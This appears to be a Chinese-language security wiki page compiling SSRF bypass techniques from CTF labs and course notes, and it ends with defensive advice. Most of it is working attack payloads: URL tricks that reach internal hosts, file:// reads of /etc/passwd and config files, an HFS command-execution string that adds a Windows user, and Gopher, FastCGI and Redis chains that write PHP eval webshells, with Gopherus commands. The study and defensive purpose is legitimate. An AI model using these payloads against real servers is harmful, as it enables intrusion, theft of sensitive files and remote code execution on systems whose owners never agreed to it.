---
title: SSRF 绕过技术实战汇总
description: 系统梳理 SSRF（服务端请求伪造）漏洞利用中的五大核心绕过技巧：用户信息绕过、十六进制 IP 绕过、302 跳转绕过、DNS 重绑定绕过、localhost
  绕过，补充 file 协议结合目录穿越读取敏感文件、内网端口扫描探测、MySQL 未授权访问验证、HFS RCE 等实战利用链，附带原理分析、Payload 构造示例及多协议利用链（Gopher/FastCGI/Redis）实战细节。
category: program-analysis
tags:
- SSRF
- Bypass Techniques
- CTF
- Web Security
- Gopher Protocol
- FastCGI
- Redis
- DNS Rebinding
- File Protocol
- Port Scanning
- MySQL
- HFS
- XD安全
date: '2024-01-15'
updated: '2026-11-15'
---

## 概述

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者利用服务端发起请求的功能，构造恶意 Payload 使服务端向内网或外网发起非预期请求。本页面基于 CTFHUB 靶场实战记录与 XD安全渗透测试课程笔记（Day29-30），系统汇总五大高频绕过手法的原理与 Payload 构造，并延伸覆盖 **file 协议本地文件读取**、**内网端口扫描与服务枚举**、**MySQL 未授权访问验证**、**HFS RCE** 等实战利用场景，以及 **Gopher 协议发送 POST/文件上传**、**FastCGI 协议 RCE**、**Redis 协议写 Shell** 等进阶利用链。

> 交叉引用：[[ssrf-ctf-exploitation-guide]]（CTFHUB SSRF 关卡完整利用链）、[[gkctf-2021-web-writeup]]（CheckBot SSRF/XSS 组合利用）、[[internal-network-pivoting-techniques]]（内网渗透中 SSRF 的横向移动定位）、[[pikachu-target-writeup-part5]]（Pikachu 靶场 SSRF 实战复现）、[[php-file-inclusion-vulnerability]]（文件包含与伪协议利用详解）

---

## 一、用户信息绕过

### 原理

URL 标准允许在 `scheme://` 后包含 `userinfo@host` 结构（`scheme://user:pass@host`）。多数后端校验逻辑仅检查 `host` 字段是否在白名单，而 HTTP 客户端（如 cURL）实际连接的是 `@` 后的真实 Host。

### 校验与实际请求的差异

| 组件 | 解析结果 |
|------|----------|
| 后端白名单校验提取的 Host | `baidu.com` |
| cURL 实际建立连接的 Host | `127.0.0.1:80` |

### Payload 示例

```text
# 要求：url must start with "http://notfound.ctfhub.com"
http://notfound.ctfhub.com@127.0.0.1/flag.php
http://notfound.ctfhub.com@127.0.0.1:8000/flag.php   # 兼配端口扫描场景
```

### 实战提示

- 结合 `@` 后跟内网 IP/域名、端口，实现**白名单绕过 + 内网探测**双重效果。
- 部分语言标准库（如 Python `urllib`、Go `net/url`）解析行为一致，通用性强。

---

## 二、十六进制 IP 绕过

### 原理

IPv4 地址支持十六进制、八进制、十进制混写。十六进制形式为 `0x` 前缀 + 8 位十六进制数（每 2 位对应一段十进制）。后端若仅对十进制点分格式做黑名单，可直接绕过。

### 转换对照

| 十进制 | 十六进制 | 说明 |
|--------|----------|------|
| 127.0.0.1 | `0x7F000001` | 0x7F=127, 0x00=0, 0x00=0, 0x01=1 |
| 127.0.0.2 | `0x7F000002` | DNS Rebinding 常用第二个 IP |

### Payload 示例

```text
# 直接访问
?url=0x7F000001/flag.php
?url=http://0x7F000001/flag.php

# 结合端口
?url=http://0x7F000001:8000/flag.php
```

### 适用场景

- 黑名单仅包含 `127.0.0.1`、`localhost`、`0.0.0.0` 等十进制写法。
- 302 跳转绕过、DNS 重绑定绕过中常作为**第一跳 IP** 使用。

---

## 三、302 跳转绕过

### 原理

应用允许 URL 发生 302 重定向时，若后端仅校验**初始 URL** 的 Host，而 HTTP 客户端自动跟随跳转至**最终 URL**（内网地址），即可绕过。

### 常见绕过链

1. **十六进制 IP 直接绕过**  
   `?url=http://0x7F000001/flag.php` —— 实测 CTFHUB 该关卡直接放行。

2. **localhost 绕过**  
   `?url=http://localhost/flag.php` —— 部分黑名单遗漏 `localhost`。

3. **自建跳转服务**  
   - 攻击者控制的公网 VPS 返回 `Location: http://127.0.0.1/flag.php`  
   - 利用 `http://attacker.com/redirect` 作为初始 URL。

### 防御视角

- 校验**重定向后的最终 Host**，或禁止自动跟随重定向（`CURLOPT_FOLLOWLOCATION = false`）。
- 统一使用 `allowlist` 而非 `blocklist`。

---

## 四、DNS 重绑定绕过

### 原理

利用 DNS TTL 为 0 或极短，配合攻击者控制的权威 DNS 服务器，使同一域名在**首次解析**（通过白名单校验）与**实际建连**（解析为内网 IP）时返回不同 A 记录。

### 实战步骤

1. **准备域名**：使用现成 Rebinder 服务（如 `rbndr.us`）或自建权威 DNS。  
   格式：`<首次解析IP>.<二次解析IP>.rbndr.us` → `7f000001.7f000002.rbndr.us`
2. **首次解析** → `127.0.0.1`（通过白名单/黑名单校验）。
3. **二次解析（建连时）** → `127.0.0.2`（实际访问内网服务）。

### Payload 示例

```text
?url=http://7f000001.7f000002.rbndr.us/flag.php
```

### 关键点

- 需受害服务器**两次解析**（校验时、建连时）间隔超过 TTL。
- 若服务端缓存 DNS 结果，可能需等待缓存过期或构造唯一子域名（`random.7f000001.7f000002.rbndr.us`）强制重新解析。

---

## 五、localhost 绕过

### 变体汇总

| 形式 | 示例 | 适用场景 |
|------|------|----------|
| 域名 | `localhost` | 黑名单遗漏 |
| IPv6 回环 | `[::1]`、`::1` | 仅过滤 IPv4 |
| 十进制变体 | `127.1`、`127.0.0.1`、`2130706433`（整数 IP） | 解析库宽容特性 |
| 八进制 | `0177.0.0.1` | 部分 C 库支持 |
| 十六进制 | `0x7F000001` | 见「十六进制 IP 绕过」 |
| 域名变体 | `localtest.me`、`lvh.me`、`vcap.me`（均解析为 127.0.0.1） | 公共 DNS 服务 |

### Payload 示例

```text
?url=http://localhost/flag.php
?url=http://[::1]/flag.php
?url=http://2130706433/flag.php
?url=http://localtest.me/flag.php
```

---

## 六、文件协议利用与本地文件读取

### 原理

当后端 HTTP 客户端（如 PHP `file_get_contents`、cURL 未禁用 `file` 协议）支持 `file://` 伪协议时，攻击者可直接请求本地文件系统路径。结合目录穿越（`../`），可突破 Web 根目录读取敏感系统文件（`/etc/passwd`、Windows `system.ini`、源码配置文件等）。

> 该技术在 XD安全 Day29 实战笔记中通过自建 `ipindex.php`（使用 `file_get_contents`）验证：`?url=file:///../../../../../../etc/password` 成功读取敏感文件。

### 利用条件

- 后端使用 `file_get_contents`、`fopen`、`curl`（未设置 `CURLOPT_PROTOCOLS` 限制）等函数。
- PHP 配置 `allow_url_fopen=On`（针对 `file_get_contents`/`fopen`）。
- 服务端进程拥有目标文件读取权限。

### Payload 示例

```text
# Linux 敏感文件
?url=file:///etc/passwd
?url=file:///proc/self/environ
?url=file:///var/www/html/config.php
?url=file:///../../../../../../etc/passwd   # 目录穿越通用写法

# Windows 敏感文件
?url=file:///C:/Windows/System32/drivers/etc/hosts
?url=file:///C:/inetpub/wwwroot/web.config

# 读取 PHP 源码（绕过执行）
?url=file:///var/www/html/index.php
```

### 结合 php://filter 读取源码

当 `file://` 直接读取 PHP 文件会被执行而非返回源码时，可嵌套 `php://filter`：

```text
?url=file:///var/www/html/index.php
# 等效于或结合：
?url=php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php
```

> 交叉引用：[[php-file-inclusion-vulnerability]]（文件包含漏洞中 `php://filter`、`php://input` 等伪协议详细利用姿势）

### 防御建议

- 禁用不必要的协议：`CURLOPT_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS`。
- PHP.ini 设置 `open_basedir` 限制文件访问目录。
- 代码层面校验 URL Scheme，仅允许 `http/https`。

---

## 七、内网服务枚举与未授权访问验证

### 原理

SSRF 可作为内网扫描器，通过探测内网 IP 段（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.1`）的常见端口，发现未授权访问的服务（Redis、MySQL、FastCGI、Jenkins、Docker API 等）。利用服务端发起请求的特权，绕过边界防火墙限制。

> XD安全 Day29 实战笔记演示：通过 `http://127.0.0.1:3306` 直接访问本地 MySQL，返回数据库版本 banner 及报错信息，验证未授权访问存在。

### 端口扫描策略

| 目标服务 | 默认端口 | 探测 Payload 示例 | 判断特征 |
|----------|----------|-------------------|----------|
| MySQL | 3306 | `http://127.0.0.1:3306` | 返回 `Host 'xxx' is not allowed to connect` 或二进制握手包 |
| Redis | 6379 | `http://127.0.0.1:6379` | 返回 `-ERR wrong number of arguments` 或 `PONG` |
| FastCGI (PHP-FPM) | 9000 | `http://127.0.0.1:9000` | 无 HTTP 响应，需 Gopher 协议交互 |
| Jenkins | 8080 | `http://127.0.0.1:8080` | 返回 Jenkins 登录页面特征 |
| Docker API | 2375 | `http://127.0.0.1:2375/version` | 返回 JSON 版本信息 |
| Elasticsearch | 9200 | `http://127.0.0.1:9200` | 返回集群信息 JSON |
| SSH | 22 | `http://127.0.0.1:22` | 返回 `SSH-2.0-OpenSSH_x.x` Banner |

### 实战技巧

1. **错误回显判断**：观察返回包长度、报错关键字（`Connection refused` vs `Host not allowed` vs 协议握手包）。
2. **Banner 抓取**：HTTP 客户端发送原始 TCP 数据后，服务返回的 Banner 即泄露版本信息。
3. **结合 Gopher 协议深度交互**：发现开放端口后，构造 Gopher Payload 发送协议特定命令（如 Redis `INFO`、`FLUSHALL`；MySQL 认证包；FastCGI 环境变量注入）。

> 交叉引用：[[internal-network-pivoting-techniques]]（内网渗透中利用 SSRF 进行横向移动、端口扫描、代理搭建的战术定位）、[[ssrf-ctf-exploitation-guide]]（CTFHUB 关卡中 `curl` 与 `file_get_contents` 协议支持差异对比及内网探测实战）

---

## 八、典型漏洞利用案例：HFS RCE (CVE-2019-?)

### 背景

HFS (HTTP File Server) 2.3m 版本存在远程代码执行漏洞，可通过 SSRF 触发（若 SSRF 点可访问内网 HFS 服务）。XD安全 Day29 笔记记录该利用思路。

### Payload

```text
# 添加用户 test1234 密码 1234
http://127.0.0.1:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}

# 通用命令执行模板
http://127.0.0.1:8080/?search==%00{.exec|cmd.exe /c [Command-String].}
```

### 利用链

`SSRF (file_get_contents/curl)` → `内网 HFS 服务` → `RCE` → `内网立足点`。

> 注：该漏洞为 HFS 自身 RCE，SSRF 仅作为触发向量。实战中需确认内网存在受影响版本 HFS。

---

## 进阶利用链：Gopher 协议构造任意 TCP 流量

Gopher 协议（`gopher://host:port/_payload`）可发送原始 TCP 数据，**是 SSRF 攻击内网非 HTTP 服务的核心武器**。

### 编码规则

1. Payload 需 **URL 编码两次**（客户端→中转服务→目标服务两次解码）。
2. 所有 `%0A` (LF) 必须手动改为 `%0D%0A` (CRLF)，符合 HTTP/Redis/FastCGI 协议规范。
3. URL 路径首字符 **`_` 会被 cURL 丢弃**，故需在 payload 前补一个任意字符（习惯用 `_`）。

### 通用构造流程

```mermaid
flowchart LR
    A[原始协议报文] --> B[一次 URL 编码]
    B --> C[将 %0A 替换为 %0D%0A]
    C --> D[二次 URL 编码]
    D --> E[gopher://ip:port/_ + 结果]
```

---

### 发送 HTTP POST / 文件上传

#### 场景

- 目标存在 `header("Location: /?url=_")` 重定向，需构造 POST 请求携带 Key。
- 文件上传需 `multipart/form-data`，含 GIF89a 头绕过内容检测。

#### 关键字段

| 字段 | 说明 |
|------|------|
| `Content-Length` | **整个 HTTP Body 长度**（含 boundary、头、文件内容） |
| `boundary` | 需与 Body 中分隔符完全一致 |
| `GIF89a` | 文件内容前缀，绕过 `getimagesize()` 等检测 |

#### 示例（节选）

```text
# 原始 HTTP 报文
POST /flag.php HTTP/1.1
Host: challenge-xxx.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx
Content-Length: 388

------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

GIF89a<?php @eval($_POST['pass']);?>
------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="submit"

提交查询
------WebKitFormBoundaryxxx--
```

→ 经两次编码 + CRLF 修正 → `gopher://127.0.0.1:80/_POST%2520%252Fflag.php...`

---

### FastCGI 协议 RCE（PHP-FPM 未授权访问）

#### 原理

PHP-FPM 默认监听 `9000` 端口，支持 `PHP_VALUE`、`PHP_ADMIN_VALUE` 环境变量注入 `auto_prepend_file=php://input`，实现任意代码执行。

#### 两种构造方式

| 方式 | 工具/脚本 | 优点 |
|------|-----------|------|
| Python 脚本 | `FastCGIClient`（参考 [GitHub](https://github.com/wuyunfeng/Python-FastCGI-Client)） | 可交互调试、动态生成参数 |
| Gopherus | `gopherus --exploit fastcgi` | 一键生成 Gopher Payload，适合 CTF 快速利用 |

#### 关键参数（Python 脚本）

```python
params = {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'POST',
    'SCRIPT_FILENAME': '/usr/local/lib/php/Pear.php',  # 任意存在的 .php 文件
    'SCRIPT_NAME': '/usr/local/lib/php/Pear.php',
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On',
    # ... 其他必需 CGI 变量
}
content = '<?php var_dump(shell_exec("ls /")); ?>'
```

#### Gopherus 生成示例

```bash
gopherus --exploit fastcgi --command "<?php system('cat /flag'); ?>" \
         --path /var/www/html/index.php --port 9000
# 输出 gopher://127.0.0.1:9000/_%01%01%42%49...
```

> 实战中需对生成的 payload **再做一次 URL 编码** 后放入 SSRF 参数。

---

### Redis 协议写 WebShell

#### 前提

- Redis 未授权访问（6379 端口）
- 可控制 `dir`、`dbfilename` 写入 Web 目录
- Web 目录可执行 PHP

#### 利用链

```redis
FLUSHALL
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php @eval($_POST['pass']);?>"
SAVE
```

#### Gopherus 一键生成

```bash
gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
         --path /var/www/html/shell.php --port 6379
```

#### 注意事项

- 返回 `504 Gateway Timeout` **不代表失败**，Shell 可能已写入。
- 直接访问 `http://target/shell.php?pass=system('cat /flag');` 验证。

---

## 综合对照表：五大绕过 + 进阶利用链 + 实战扩展

| 绕过/利用类型 | 典型 Payload / 手法 | 适用条件 | 进阶利用链示例 |
|----------------|---------------------|----------|----------------|
| 用户信息绕过 | `http://whitelist.com@127.0.0.1/flag.php` | 白名单校验仅取 Host | Gopher POST / FastCGI / Redis |
| 十六进制 IP | `http://0x7F000001/flag.php` | 黑名单仅含十进制 IP | 端口扫描、302 跳转首跳 |
| 302 跳转 | `http://attacker.com/redirect` → `Location: http://127.0.0.1` | 后端校验初始 URL、客户端跟随跳转 | 绕过黑名单访问任意内网服务 |
| DNS 重绑定 | `http://7f000001.7f000002.rbndr.us/flag.php` | 两次解析间隔 > TTL、域名可控 | 绕过 IP 维度黑白名单 |
| localhost 变体 | `http://localhost`、`http://[::1]`、`http://localtest.me` | 黑名单不全 | 同十六进制 IP |
| **file 协议 + 目录穿越** | `file:///../../../../etc/passwd` | 支持 file 协议、允许 URL 包含 `../` | 读取源码、配置文件、历史记录、SSH Key |
| **内网端口扫描** | `http://127.0.0.1:3306`、`http://10.0.0.1:6379` | SSRF 点可出网/访问内网、错误回显 | 发现未授权 Redis/MySQL/FastCGI/Jenkins |
| **MySQL 未授权验证** | `http://127.0.0.1:3306` | MySQL 绑定 0.0.0.0、无密码/弱密码 | 获取版本、配合 Gopher 发送认证包尝试登录 |
| **HFS RCE** | `/?search==%00{.exec|cmd.exe /c ... .}` | 内网存在 HFS 2.3m、SSRF 可达 | 直接获取系统权限、添加用户、反弹 Shell |
| Gopher HTTP POST | `gopher://ip:port/_POST%2520...` | 目标需 POST 交互、文件上传 | 绕过 CSRF Token、上传 Webshell |
| Gopher FastCGI | `gopher://ip:9000/_%01%01...` | PHP-FPM 监听 0.0.0.0:9000 | RCE、绕过 disable_functions |
| Gopher Redis | `gopher://ip:6379/_*1%250D%250A...` | Redis 未授权、可写 Web 目录 | 写 Webshell、计划任务反弹 Shell |

---

## 防御建议

1. **统一解析与校验**：使用成熟 URL 解析库提取 `hostname`，**禁止自定义正则**。
2. **允许列表而非阻止列表**：仅允许业务必要的域名/IP 段。
3. **禁止/限制重定向**：`CURLOPT_FOLLOWLOCATION = false` 或手动校验每跳 Host。
4. **禁用不必要的协议**：`CURLOPT_PROTOCOLS` 仅允许 `HTTP/HTTPS`，屏蔽 `file/gopher/dict/ldap/...`。
5. **内网访问隔离**：应用层面拒绝 `10/8`、`172.16/12`、`192.168/16`、`127/8`、`169.254/16`、`::1`、`fc00::/7` 等私有/保留地址。
6. **DNS 解析固化**：首次解析结果缓存并复用，或使用 `getaddrinfo` 配合 `AI_ADDRCONFIG` 限制地址族。
7. **最小权限运行**：PHP-FPM、Redis、MySQL 等内网服务**勿绑定 0.0.0.0**，启用认证、绑定 Unix Socket 或本地回环。
8. **错误信息脱敏**：避免在 HTTP 响应中直接返回数据库/中间件原始报错 Banner，防止辅助 SSRF 端口探测确认。

---

## 参考工具与资源

| 工具/资源 | 用途 | 链接 |
|-----------|------|------|
| **Gopherus** | 自动生成 Gopher/FastCGI/Redis/MySQL/... Payload | <https://github.com/tarunkant/Gopherus> |
| **FastCGI Client (Python)** | 交互式 FastCGI 利用、调试 | <https://github.com/wuyunfeng/Python-FastCGI-Client> |
| **rbndr.us** | 现成 DNS Rebinder 服务 | <https://lock.cmpxchg8b.com/rebinder.html> |
| **CTFHUB SSRF 关卡** | 实战练习环境 | <https://ctfhub.com> |
| **SSRF 绕过备忘单** | Payload 速查表 | <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery> |
| **XD安全渗透测试课程 Day29-30** | 本页面补充案例来源（CSRF/SSRF/RCE 学习笔记） | 微信公众号「XD安全」归档 |

---

## 交叉引用索引

- [[ssrf-ctf-exploitation-guide]] — CTFHUB SSRF 全关卡利用链（内网探测、Gopher/Redis/FastCGI RCE、双重 URL 编码技巧）
- [[gkctf-2021-web-writeup]] — CheckBot 题目中 SSRF 结合 XSS 窃取 Flag 的组合利用
- [[internal-network-pivoting-techniques]] — 内网渗透中利用 SSRF 进行横向移动、端口扫描、代理搭建的战术定位
- [[pikachu-target-writeup-part5]] — Pikachu 靶场 SSRF 实战复现（目录遍历、信息泄露、PHP 反序列化、XXE、不安全重定向、SSRF 六大漏洞）
- [[php-file-inclusion-vulnerability]] — PHP 文件包含漏洞成因、伪协议（file/php/filter/input/data）利用链、任意文件下载检测
- [[php-webshell-fundamentals-chopper-analysis]] — PHP 一句话木马原理与蚁剑连接流程，配合 Redis/FastCGI 写 Shell 后的后续利用
- [[mysql-dnslog-injection-loadfile-unc]] — MySQL `load_file()` + UNC 路径实现 DNSLog 盲注数据外带，思路与 SSRF DNS 重绑定异曲同工
- [[xd-security-csrf-ssrf-rce-notes-day29-30]] — XD安全渗透测试课程 Day29-30 学习笔记原文归档（CSRF/SSRF/RCE 案例讲解）

## 来源

- [0x00实验室-202108-202304_069](../sources/0x00实验室-202108-202304_069.md)
- [0x00实验室-202108-202304_101](../sources/0x00实验室-202108-202304_101.md)
